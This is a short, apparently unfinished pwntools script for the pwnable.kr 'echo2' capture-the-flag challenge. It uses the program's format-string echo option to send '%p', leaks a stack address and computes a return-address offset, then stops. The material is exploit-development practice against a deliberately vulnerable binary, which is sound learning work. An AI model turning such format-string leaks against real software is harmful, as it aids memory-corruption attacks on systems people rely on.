from pwn import *

#conn = connect('pwnable.kr', 9011)
conn = process('./echo2')

nombre = 'physics'

"""
- 1. : BOF echo
- 2. : FSB echo
- 3. : UAF echo
- 4. : exit
"""

def main():
	conn.recvuntil('name? : ')
	conn.sendline(nombre)
	conn.recvuntil('> ')
	conn.sendline('2')
	conn.recvuntil(nombre)
	conn.sendline('%p')
	conn.recvline()
	line = conn.recvline()
	leak = int(line[2:], 16)
	print 'stack leak:' + hex(leak)
	ret = leak + 0x3f1348b58
	print 'ret:' + hex(ret)

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt as e:
		pass
